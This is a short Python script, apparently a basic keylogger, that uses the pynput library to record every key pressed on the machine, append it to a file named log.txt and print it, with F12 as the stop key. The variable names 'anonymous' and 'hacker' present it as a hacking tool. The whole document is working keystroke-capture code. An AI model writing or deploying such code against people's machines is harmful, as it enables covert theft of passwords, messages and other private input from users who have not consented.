from pynput.keyboard import Listener
#pynput.mouse: control mouse

def anonymous(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "ctr_l":
        key = "\n"
    if key == "Key.enter":
        key = "\n"
    if key == "Key.alt_l":
        key = "\n"

    with open ("log.txt", "a") as file:
        file.write(key)
    print(key)


with Listener(on_press=anonymous) as hacker:
    hacker.join()


